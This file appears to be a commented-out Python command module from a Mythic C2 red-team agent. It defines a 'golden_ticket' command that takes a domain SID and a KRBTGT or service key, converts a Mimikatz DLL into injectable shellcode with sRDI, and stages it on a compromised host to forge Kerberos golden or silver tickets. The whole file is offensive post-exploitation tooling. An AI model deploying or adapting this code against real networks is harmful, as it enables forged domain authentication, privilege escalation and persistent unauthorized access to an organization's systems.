# from mythic_payloadtype_container.MythicCommandBase import *
# import json
# from uuid import uuid4
# from sRDI import ShellcodeRDI
# from os import path
# from mythic_payloadtype_container.MythicRPC import *


# class GoldenTicketArguments(TaskArguments):

#     valid_args = ["domain",
#                     "sid",
#                     "user",
#                     "id",
#                     "groups",
#                     "key_type",
#                     "key",
#                     "target",
#                     "service",
#                     "startoffset",
#                     "endin",
#                     "renewmax",
#                     "sids",
#                     "sacrificial_logon"]

#     def __init__(self, command_line):
#         super().__init__(command_line)
#         self.args = {
#             "domain": CommandParameter(name="domain", type=ParameterType.String, required=True, description="Must be FQDN"),
#             "sid": CommandParameter(name="sid", type=ParameterType.String, required=True, description="The domain SID"),
#             "user": CommandParameter(name="user", type=ParameterType.String, required=True, description="Account name"),
#             "id": CommandParameter(name="id", type=ParameterType.String, required=False, description="Account RID"),
#             "groups": CommandParameter(name="groups", type=ParameterType.String, required=False, description="Comma-seperated list of group RIDs - no spaces"),
#             "key_type": CommandParameter(name="key_type", type=ParameterType.ChooseOne, choices=["rc4", "aes128", "aes256"], required=True),
#             "key": CommandParameter(name="key", type=ParameterType.String, required=True, description="The key for the KRBTGT account (or service account for silver tickets)"),
#             "target": CommandParameter(name="target", type=ParameterType.String, required=False, description="Target name (for silver tickets only - leave blank for golden tickets)"),
#             "service": CommandParameter(name="service", type=ParameterType.String, required=False, description="Service name (for silver tickets only - leave blank for golden tickets)"),
#             "startoffset": CommandParameter(name="startoffset", type=ParameterType.Number, required=False, description="Start time offset for the ticket"),
#             "endin": CommandParameter(name="endin", type=ParameterType.Number, default_value=600, required=False, description="Expiry time for the ticket from now - default should be 10 hours"),
#             "renewmax": CommandParameter(name="renewmax", type=ParameterType.Number, default_value=10080, required=False, description="Renewal time for the ticket from now - default should be 7 days"),
#             "sids": CommandParameter(name="sids", type=ParameterType.String, required=False, description="Extra SIDs"),
#             "sacrificial_logon": CommandParameter(name="sacrificial_logon", type=ParameterType.Boolean, default_value=True, required=True, description="Specifies whether to create a sacrificial logon to avoid overwriting the ticket of the current user")
#         }


#     async def parse_command_line_arguments(self):
#         cmdline_args = self.command_line.strip().split(" ")
#         if len(cmdline_args) > len(self.valid_args):
#             raise Exception("golden_ticket takes at most {} parameters, but got: {}".format(len(self.valid_args), len(cmdline_args)))
#         for golden_ticket_arg in cmdline_args:
#             parts = golden_ticket_arg.split(":")
#             if len(parts) > 2:
#                 raise Exception("Invalid number of arguments or invalid separator in argument: {}".format(golden_ticket_arg))
#             param = parts[0]
#             val = parts[1]
#             # I actually don't think we ever hit this, but whatever.
#             if " " in val:
#                 raise Exception("No spaces allowed in value: {}".format(val))
#             param = param[1:].lower()
#             if param in self.valid_args:
#                 try:
#                     self.add_arg(param, int(val))
#                 except:
#                     self.add_arg(param, val)
#             else:
#                 raise Exception("Invalid argument given to golden_ticket: {}".format(param))


#     async def parse_arguments(self):
#         if len(self.command_line) == 0:
#             raise Exception("golden_ticket requires arguments.")
#         if self.command_line[0] == "{":
#             self.load_args_from_json_string(self.command_line)
#         else:
#             await self.parse_command_line_arguments()
#         self.add_arg("pipe_name", str(uuid4()))
#         for varg in self.valid_args:
#             value = self.get_arg(varg)
#             if value and isinstance(value, str) and " " in value:
#                 raise Exception("No spaces allowed in parameter '{}', but got: {}".format(varg, self.get_arg(varg)))

#         required_args = ["domain",
#                         "sid",
#                         "user",
#                         "key_type",
#                         "key",
#                         "sacrificial_logon"]
#         for arg in required_args:
#             if not self.get_arg(arg):
#                 if arg == "sacrificial_logon":
#                     self.add_arg(arg, True)
#                 else:
#                     raise Exception("Missing mandatory parameter: {}".format(arg))

# class GoldenTicketCommand(CommandBase):
#     cmd = "golden_ticket"
#     needs_admin = True
#     help_cmd = "golden_ticket (modal popup)"
#     description = "Forge a golden/silver ticket using Mimikatz."
#     version = 2
#     is_exit = False
#     is_file_browse = False
#     is_process_list = False
#     is_download_file = False
#     is_upload_file = False
#     is_remove_file = False
#     author = "@elad_shamir"
#     argument_class = GoldenTicketArguments
#     browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
#     attackmapping = []

#     async def create_tasking(self, task: MythicTask) -> MythicTask:
#         dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
#         dllBytes = open(dllFile, 'rb').read()
#         converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
#         file_resp = await MythicRPC().execute("create_file",
#                                               task_id=task.id,
#                                               file=base64.b64encode(converted_dll).decode(),
#                                               delete_after_fetch=True)
#         if file_resp.status == MythicStatus.Success:
#             task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
#         else:
#             raise Exception("Failed to register Mimikatz DLL: " + file_resp.error)
#         # task.display_params = "/dc:{} /domain:{} /user:{}".format(self.args.get_arg)
#         display_str = ""
#         no_display = ["loader_stub_id", "pipe_name", "sacrificial_logon"]
#         for arg in task.args.args:
#             varg = task.args.get_arg(arg)
#             if varg and arg not in no_display:
#                 display_str += "/{}:{} ".format(arg, varg)
#         task.display_params = display_str.strip()
#         return task

#     async def process_response(self, response: AgentResponse):
#         pass

